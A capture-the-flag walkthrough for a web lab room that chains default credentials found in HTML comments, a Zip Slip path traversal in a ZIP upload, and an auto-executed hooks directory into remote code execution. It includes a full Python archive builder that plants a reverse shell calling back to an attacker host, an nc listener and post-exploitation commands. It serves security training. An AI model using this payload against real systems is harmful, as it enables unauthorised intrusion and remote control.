## ## Walkthrough: TryHackMe Room: "The Hollow Shell"

> **Room:** The Hollow Shell  
> **Category:** Web  
> **Difficulty:** Medium  
> **Objective:** Obtain the flag by exploiting a vulnerable shell upload mechanism.

---

# Executive Summary

The application allows authenticated users to upload ZIP-based "shell" packages used by the hotel's Shoreline Display system. While the upload mechanism validates the presence of a `shell.json` manifest, it fails to properly sanitize archive paths during extraction.

This results in a classic **Zip Slip (Archive Path Traversal)** vulnerability, allowing arbitrary file writes outside the intended extraction directory.

A background automation worker subsequently imports and executes Python files from the application's `hooks/` directory. By abusing the arbitrary file write, it is possible to place a malicious Python callback inside the hooks directory, resulting in **Remote Code Execution (RCE)**.

---

# Attack Path

```
Information Disclosure
        │
        ▼
Default Credentials
        │
        ▼
Authenticated Upload
        │
        ▼
Zip Slip
        │
        ▼
Arbitrary File Write
        │
        ▼
Drop Python Hook
        │
        ▼
Background Worker Executes Hook
        │
        ▼
Reverse Shell
        │
        ▼
Read Flag
```

---

# Enumeration

## Port Scan

```bash
nmap -Pn -sC -sV TARGET_IP
```

Result:

```
22/tcp    open    ssh
5000/tcp  open    http
```

SSH only accepted public-key authentication.

The web application was hosted on port **5000**.

---

# Initial Enumeration

Visiting the application revealed a login page.

Viewing the page source exposed developer comments containing default credentials.

```html
<!--
user: concierge
pass: StayNoticed2024!
-->
```

Login:

```
Username: concierge
Password: StayNoticed2024!
```

Successful authentication provided access to the dashboard.

---

# Dashboard Analysis

The dashboard disclosed several important implementation details.

```
Each shell must contain a shell.json manifest.

Automation hooks are applied shortly after the shell comes ashore.

Allowed asset types:

png
jpg
gif
svg
css
json
```

These statements immediately suggested:

- ZIP extraction
- Manifest parsing
- Background worker
- Hook execution

---

# Understanding the Upload Format

A minimal valid shell consisted of:

```
shell.zip
├── shell.json
```

Example manifest:

```json
{
    "name":"test",
    "assets":[]
}
```

Packaging:

```bash
printf '%s\n' '{"name":"test","assets":[]}' > shell.json

zip baseline.zip shell.json
```

Upload succeeded.

---

# Investigating shell.json

The uploaded manifest became accessible at:

```
/shells/<id>/shell.json
```

Adding arbitrary values inside the manifest also succeeded.

Examples:

```json
"hooks":[]
```

```json
"hooks":["test"]
```

```json
"hooks":[{}]
```

Even command strings were accepted without validation:

```json
"hooks":[
    "id",
    "whoami"
]
```

This indicated that the backend accepted the field but did not immediately execute arbitrary commands.

The upload parser simply stored the manifest.

---

# Discovering Zip Slip

The application extracts uploaded ZIP archives.

A common archive extraction vulnerability is **Zip Slip**, where archive entries containing `../` escape the intended extraction directory.

Example malicious archive:

```python
import json
import zipfile

manifest = {
    "name":"zipslip-proof",
    "assets":[]
}

with zipfile.ZipFile("zipslip-proof.zip","w") as archive:

    archive.writestr(
        "shell.json",
        json.dumps(manifest)
    )

    archive.writestr(
        "../../static/zipslip-proof.css",
        "ZIP_SLIP_CONFIRMED\n"
    )
```

Listing:

```
Archive:
shell.json

../../static/zipslip-proof.css
```

Uploading the archive successfully wrote files outside the extraction directory, confirming a **Zip Slip arbitrary file write** vulnerability. Archive path traversal (Zip Slip) occurs when archive extractors do not sanitize `../` components before writing files. :contentReference[oaicite:0]{index=0}

---

# Understanding the Application Layout

The vulnerable application was effectively structured as:

```
application-root
│
├── static/
│
├── shells/
│
└── hooks/
```

The **hooks/** directory was especially interesting because the dashboard explicitly mentioned a background worker processing automation hooks.

---

# Exploitation Strategy

Rather than writing into `static/`, we targeted the application's **hooks** directory.

Our archive contained:

```
shell.json

../../hooks/callback.py
```

When extracted:

```
hooks/callback.py
```

was created outside the upload directory.

---

# Reverse Shell Payload

Create the payload:

```python
import json
import zipfile

LHOST="ATTACKBOX_IP"
LPORT=4444

manifest={
    "name":"shoreline-update",
    "assets":[]
}

callback=f'''
import os
import pty
import socket

sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
sock.connect(({LHOST!r},{LPORT}))

for fd in (0,1,2):
    os.dup2(sock.fileno(),fd)

pty.spawn("/bin/bash")
'''

with zipfile.ZipFile("reverse-shell.zip","w") as archive:

    archive.writestr(
        "shell.json",
        json.dumps(manifest)
    )

    archive.writestr(
        "../../hooks/callback.py",
        callback
    )
```

Generate:

```bash
python3 build_shell.py
```

Verify:

```bash
unzip -l reverse-shell.zip
```

Output:

```
shell.json

../../hooks/callback.py
```

---

# Start Listener

```bash
nc -lvnp 4444
```

Upload:

```
reverse-shell.zip
```

The background worker later imported the malicious callback.

Connection received:

```
Connection received on TARGET 59730

roomservice@tryhackme:/var/www/conch$
```

This achieved **Remote Code Execution**.

---

# Post Exploitation

Current user:

```bash
whoami
```

```
roomservice
```

Current directory:

```bash
pwd
```

```
/var/www/conch
```

Search for flags:

```bash
find / -type f \( \
-name "flag*" \
-o -name "user.txt" \
-o -name "root.txt" \
\) 2>/dev/null
```

Result:

```
/home/roomservice/flag.txt
```

Read the flag:

```bash
cat /home/roomservice/flag.txt
```

Flag:

```
THM{..................}
```

---

# Root Cause Analysis

The application trusted archive entry paths supplied by user-controlled ZIP files.

Instead of normalizing extracted paths, the extractor honored directory traversal sequences:

```
../../hooks/callback.py
```

This allowed files to escape the upload directory and overwrite arbitrary locations within the application.

Because the application's background worker automatically imported files from the `hooks/` directory, the arbitrary file write became a reliable **Remote Code Execution** primitive.

---

# Vulnerabilities

| Vulnerability | Severity |
|--------------|----------|
| Information Disclosure (Hardcoded Credentials) | Medium |
| Weak Default Credentials | Medium |
| Zip Slip (Archive Path Traversal) | High |
| Arbitrary File Write | Critical |
| Automatic Hook Execution | Critical |
| Remote Code Execution | Critical |

---

# Attack Chain Summary

```
HTML Source
        │
        ▼
Default Credentials
        │
        ▼
Dashboard Access
        │
        ▼
ZIP Upload
        │
        ▼
Zip Slip
        │
        ▼
Arbitrary File Write
        │
        ▼
Drop callback.py into hooks/
        │
        ▼
Background Worker
        │
        ▼
Python Reverse Shell
        │
        ▼
roomservice Shell
        │
        ▼
Read Flag
```

---

# Flag

```
THM{.....................}
```

---

# Skills Learned

- Source code reconnaissance
- Information disclosure analysis
- ZIP archive structure
- Manifest validation
- Zip Slip exploitation
- Arbitrary file write
- Python-based reverse shells
- Background worker abuse
- Post-exploitation enumeration
- Linux shell stabilization
